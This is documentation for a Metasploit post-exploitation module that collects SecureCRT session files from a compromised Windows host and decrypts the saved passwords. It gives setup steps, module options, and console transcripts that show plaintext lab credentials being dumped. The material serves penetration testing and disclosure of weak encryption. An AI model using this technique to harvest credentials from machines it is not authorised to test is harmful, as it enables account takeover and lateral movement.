## Vulnerable Application

All [SecureCRT](https://www.vandyke.com/cgi-bin/releases.php?product=securecrt) installations are affected, regardless
of which OS they are installed on, since they all use the same encryption mechanisms described by HyperSine in
his [GitHub paper](https://github.com/HyperSine/how-does-SecureCRT-encrypt-password).
Note that at the moment this module only supports exploiting Windows machines.

### Overview
All versions of SecureCRT have an option to allow users to store an encrypted copy of their session information on the
local computer, allowing them to easily restart a session without having to reenter all the connection details such as
the host, username, and password. These details are stored in a local session file, and SecureCRT will additionally
encrypt the password with AES encryption.

Unfortunately for SecureCRT users, the encryption mechanism used uses a weak IV of all 0's, and the encryption
keys that are utilized to encrypt the passwords have been publicly reversed and documented by HyperSine
in [his GitHub paper](https://github.com/HyperSine/how-does-SecureCRT-encrypt-password).

In addition, HyperSine also published a PoC script that allows users to decrypt SecureCRT session files, regardless
of the version of SecureCRT installed. The only limitation is that users must know the SecureCRT configuration password
if one was set at installation. At the time of writing, September 11, 2020, it appears that Vandyke, the creators of
SecureCRT, have still not changed the implementation details for this session encryption algorithm.

This module ports the work from HyperSine and implements it in a Metasploit module that allows users to easily retrieve
any SecureCRT session files from a compromised Windows machine and then decrypt the session passwords where its possible
to do so. All session information retrieved will be stored a Metasploit loot file, along with the password if
it can be decrypted.

### Setup Steps

1. Download the latest installer of SecureCRT from https://www.vandyke.com/cgi-bin/releases.php?product=securecrt.
   You will need a valid login, which can be obtained by completing the registration form at
   https://www.vandyke.com/cgi-bin/download_application.php?pid=scrt_x64_873&force=1, after which an
   email will be sent to you with the valid login details.
2. Follow the installer's prompts to install the software. Select all the default settings.
3. Once everything has been installed, start SecureCRT. A prompt will appear asking if one wants to set a
   configuration passphrase to encrypt sensitive data such as saved passwords and login actions. Set a
   passphrase of your choice here, but be sure to remember it.
4. Set up a SSH server on your target. For Windows 10 v1809 and later and
   Windows Server 2019 and later, this can be done by running the PowerShell
   command `Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0`,
   followed by `Start-Service sshd`.

## Verification Steps

  1. Use SecureCRT to login to a SSH server of your choosing. When logging in,
     remember to select the check boxes to save the username (should be selected
     by default), as well as the checkbox to save the account password.
  3. Get a `meterpreter` session on the Windows host running SecureCRT.
  4. Do: `run post/windows/gather/credentials/securecrt`
  5. Optional: Run `set PASSPHRASE *SecureCRT configuration passphrase*` if a configuration
     passphrase was set for SecureCRT and you are aware of what its value is.
  5. If the session file was saved on the target, the module will print out the details
     of the host and port that the user connected to, as well as which username the user
     signed in with and the plaintext version of the password that was used.

## Options

### PASSPHRASE
The configuration password that was set when SecureCRT was installed, if one was supplied.
Note that if this value is not supplied and SecureCRT was set up to use a configuration password,
it will not be possible to decrypt the encrypted SecureCRT passwords that are retrieved.

### SESSION_PATH
The path to the SecureCRT session directory on the target's computer. By default this is normally
stored at `C:\\Users\\*current user name*\\AppData\\Roaming\\VanDyke\\Config\\Sessions` if SecureCRT
is installed on the system, however SecureCRT also has a portable version that stores the session information
in a local folder along with the SecureCRT binary itself, allowing users to easily transfer their session
information between machines. In this case, users can set the `SESSION_PATH` option to the location
of the session directory within the portable folder to allow them to obtain SecureCRT session
information even if a portable version of SecureCRT is utilized on the target.

## Scenarios

### Windows Server 2019 Standard Edition with SecureCRT v8.7.3 Build 2279 (Configuration Password Enabled)
```
msf6 exploit(multi/handler) > use post/windows/gather/credentials/securecrt
msf6 post(windows/gather/credentials/securecrt) > info

       Name: Windows SecureCRT Session Information Enumeration
     Module: post/windows/gather/credentials/securecrt
   Platform: Windows
       Arch:
       Rank: Normal

Provided by:
  HyperSine
  Kali-Team <kali-team@qq.com>

Compatible session types:
  Meterpreter

Basic options:
  Name        Current Setting   Required  Description
  ----        ---------------   --------  -----------
  PASSPHRASE                    no        The configuration password that was set when SecureCRT was installed, if one was supplied
  SESSION                       yes       The session to run this module on.

Description:
  This module will determine if SecureCRT is installed on the target
  system and, if it is, it will try to dump all saved session
  information from the target. The passwords for these saved sessions
  will then be decrypted where possible, using the decryption
  information that HyperSine reverse engineered. Note that whilst
  SecureCRT has installers for Linux, Mac and Windows, this module
  presently only works on Windows.

References:
  https://github.com/HyperSine/how-does-SecureCRT-encrypt-password/blob/master/doc/how-does-SecureCRT-encrypt-password.md

msf6 post(windows/gather/credentials/securecrt) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/credentials/securecrt) > set Passphrase whatabadpassword
Passphrase => whatabadpassword
msf6 post(windows/gather/credentials/securecrt) > run

[*] Gathering SecureCRT session information from WIN-M5JU6L5RA9L
[*] Searching for session files in C:\Users\normal\AppData\Roaming\VanDyke\Config\Sessions
SecureCRT Sessions
==================

Filename           Protocol  Hostname   Port  Username              Password
--------           --------  --------   ----  --------              --------
127.0.0.1 (1).ini  telnet    127.0.0.1  23    RAPID7\Administrator  thePassword123!
127.0.0.1 (2).ini  ssh2      127.0.0.1  22    Administrator         thePassword123!
127.0.0.1 (3).ini  ssh2      127.0.0.1  22    Administrator
127.0.0.1.ini      telnet    127.0.0.1  23

msf6 post(windows/gather/credentials/securecrt) >
```

### Windows Server 2019 Standard Edition with SecureCRT v8.7.3 Build 2279 (Configuration Password Enabled, But No Password Provided)
```
msf6 exploit(multi/handler) > use post/windows/gather/credentials/securecrt
msf6 post(windows/gather/credentials/securecrt) > info

       Name: Windows SecureCRT Session Information Enumeration
     Module: post/windows/gather/credentials/securecrt
   Platform: Windows
       Arch:
       Rank: Normal

Provided by:
  HyperSine
  Kali-Team <kali-team@qq.com>

Compatible session types:
  Meterpreter

Basic options:
  Name        Current Setting   Required  Description
  ----        ---------------   --------  -----------
  PASSPHRASE                    no        The configuration password that was set when SecureCRT was installed, if one was supplied
  SESSION                       yes       The session to run this module on.

Description:
  This module will determine if SecureCRT is installed on the target
  system and, if it is, it will try to dump all saved session
  information from the target. The passwords for these saved sessions
  will then be decrypted where possible, using the decryption
  information that HyperSine reverse engineered. Note that whilst
  SecureCRT has installers for Linux, Mac and Windows, this module
  presently only works on Windows.

References:
  https://github.com/HyperSine/how-does-SecureCRT-encrypt-password/blob/master/doc/how-does-SecureCRT-encrypt-password.md

msf6 post(windows/gather/credentials/securecrt) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/credentials/securecrt) > run

[*] Gathering SecureCRT session information from WIN-M5JU6L5RA9L
[*] Searching for session files in C:\Users\Administrator\AppData\Roaming\VanDyke\Config\Sessions
[-] It seems the user set a configuration password when installing SecureCRT!
[-] If you know the configuration password, please provide it via the PASSPHRASE option and then run the module again.
SecureCRT Sessions
==================

Filename       Hostname   Port  Username              Password
--------       --------   ----  --------              --------
127.0.0.1.ini  127.0.0.1  22    RAPID7\Administrator

[+] Session info stored in: /home/gwillcox/.msf4/loot/20200911125521_default_172.20.150.24_host.securecrt_s_951139.txt
[*] Post module execution completed
msf6 post(windows/gather/credentials/securecrt) >
```
